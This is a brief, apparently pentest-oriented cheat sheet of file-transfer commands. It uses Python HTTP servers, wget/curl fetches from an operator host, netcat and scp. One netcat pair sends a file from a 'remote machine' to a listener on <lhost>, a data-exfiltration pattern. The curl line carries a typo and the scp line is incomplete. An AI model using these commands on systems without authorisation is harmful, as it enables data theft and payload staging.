## File Transfer

Web Server:
```
python2 -m SimpleHTTPServer 8000
python3 -m http.server 8000

wget http://<lhost>:8000/<file>
curl httl://<lhost>:8000/<file> -O
```

Netcat
```
nc -nvlp <lport> > file         # local machine
nc -vn <lhost> <lport> < file   # remote machine
```

SCP
```
scp <user>@<rhost>:/path
```
